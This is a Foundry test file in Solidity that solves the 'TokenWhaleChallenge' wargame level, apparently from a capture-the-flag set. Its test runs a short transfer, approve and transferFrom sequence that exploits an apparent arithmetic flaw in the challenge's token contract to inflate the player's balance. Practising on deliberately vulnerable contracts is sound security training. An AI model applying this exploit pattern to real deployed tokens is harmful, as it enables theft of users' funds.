// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;
pragma abicoder v2;

import {Test} from "forge-std/Test.sol";
import {TokenWhaleChallenge} from "../../src/math/challenges/TokenWhaleChallenge.sol";

contract TestTokenWhaleChallenge is Test {
    TokenWhaleChallenge challenge;

    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address playerAlt = makeAddr("playerAlt");

    function setUp() external {
        vm.prank(deployer);
        challenge = new TokenWhaleChallenge(player);
    }

    function test_Solution() external {
        vm.prank(player);
        challenge.transfer(playerAlt, 501);

        assertEq(challenge.balanceOf(player), 499);
        assertEq(challenge.balanceOf(playerAlt), 501);

        vm.prank(playerAlt);
        challenge.approve(player, 500);

        vm.prank(player);
        challenge.transferFrom(playerAlt, playerAlt, 500);

        assert(challenge.isComplete());
    }
}
